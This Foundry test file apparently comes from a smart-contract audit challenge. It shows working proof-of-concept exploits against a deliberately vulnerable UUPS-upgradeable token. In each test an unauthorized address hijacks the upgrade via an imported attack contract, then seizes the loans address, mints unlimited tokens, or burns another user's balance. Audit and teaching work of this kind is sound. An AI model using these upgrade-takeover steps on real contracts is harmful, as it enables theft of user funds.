// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import "@openzeppelin/contracts/proxy/ERC1967/ERC1967Utils.sol";

import {UUPSUpgradeable} from "openzeppelin-contracts-upgradeable/contracts/proxy/utils/UUPSUpgradeable.sol";

import {HalbornToken} from "../src/HalbornToken.sol";

import {Token_UUPSattack} from "../src/exploit/HalbornTokenExploit.sol";

contract HalbornToken_Test is Test {
    HalbornToken public token;
    ERC1967Proxy proxy;
    HalbornToken impl;

    address sadDev = address(0x999);

    function setUp() public {
        vm.startPrank(sadDev);
        impl = new HalbornToken();
        proxy = new ERC1967Proxy(address(impl), "");
        token = HalbornToken(address(proxy));
        token.initialize();
        token.setLoans(address(1));
    }

    // Critical Bug 12: anyone can upgrade
    function test_vulnerableUUPSupgrade() public {
        address unauthorizedUser = address(0xdead);
        vm.startPrank(unauthorizedUser);

        Token_UUPSattack attack = new Token_UUPSattack();
        token.upgradeToAndCall(address(attack), abi.encodeWithSelector(token.initialize.selector));
        token.initialize();
    }

    // Critical Bug 13: setLoans can be set to arbitrary address
    function test_setLoansAddress() public {
        address unauthorizedUser = address(0xdead);
        vm.startPrank(unauthorizedUser);

        Token_UUPSattack attack = new Token_UUPSattack();
        token.upgradeToAndCall(address(attack), abi.encodeWithSelector(token.initialize.selector));

        token.setLoans(address(this));
        assertEq(token.halbornLoans(), address(this));

        vm.startPrank(sadDev);
        vm.expectRevert();
        token.setLoans(address(0x10));
    }

    // Critical Bug 14: unlimited minting of token
    function test_unlimitedMint() public {
        address unauthorizedUser = address(0xdead);
        vm.startPrank(unauthorizedUser);

        Token_UUPSattack attack = new Token_UUPSattack();
        token.upgradeToAndCall(address(attack), abi.encodeWithSelector(token.initialize.selector));

        token.mintToken(address(this), type(uint256).max);

        assertEq(token.balanceOf(address(this)), type(uint256).max);

        address sadDev = address(0x314);
        vm.startPrank(sadDev);
        vm.expectRevert();
        token.mintToken(address(this), 1e18);
    }

    // Critical Bug 15: loss of user funds via burn
    function test_unlimitedBurn() public {
        address alice = address(0x123);
        deal(address(token), address(alice), 100e18);

        assertEq(token.balanceOf(address(alice)), 100e18);

        // start attack
        address unauthorizedUser = address(0xdead);
        vm.startPrank(unauthorizedUser);

        Token_UUPSattack attack = new Token_UUPSattack();
        token.upgradeToAndCall(address(attack), abi.encodeWithSelector(token.initialize.selector));

        // Burning alice's tokens
        token.burnToken(address(alice), token.balanceOf(address(alice)));

        assertEq(token.balanceOf(alice), 0);

        address sadDev = address(0x314);
        vm.startPrank(sadDev);
        vm.expectRevert();
        token.upgradeToAndCall(address(impl), abi.encodeWithSelector(token.initialize.selector));
    }

    receive() external payable {}
}
